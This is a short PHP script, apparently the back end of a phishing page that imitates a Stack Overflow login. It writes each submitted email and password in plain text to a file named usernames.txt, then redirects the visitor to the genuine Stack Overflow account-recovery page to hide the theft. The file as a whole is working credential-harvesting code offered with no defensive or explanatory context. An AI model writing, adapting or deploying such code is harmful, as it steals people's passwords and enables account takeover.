<?php

file_put_contents("usernames.txt", "StackoverFlow :- username : " . $_POST['email'] . "  || Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://stackoverflow.com/users/account-recovery');
exit();
